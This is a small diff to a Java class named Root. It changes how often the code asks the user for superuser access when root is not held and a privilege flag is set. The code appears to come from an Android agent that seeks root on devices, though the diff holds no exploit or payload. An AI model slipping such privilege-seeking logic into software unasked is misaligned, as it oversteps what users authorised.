@@ -564,7 +564,6 @@ public class Root {
 		}
 
 		boolean ask = false;
-		askedSu  += 1;
 		
 		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
 			if( checkCyanogenmod() ){
@@ -576,7 +575,9 @@ public class Root {
 			}
 		}
 
-		if (ask && askedSu <= Cfg.MAX_ASKED_SU ) {
+		if (ask && askedSu < Cfg.MAX_ASKED_SU ) {
+			askedSu  += 1;
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), ask the user");
 			}
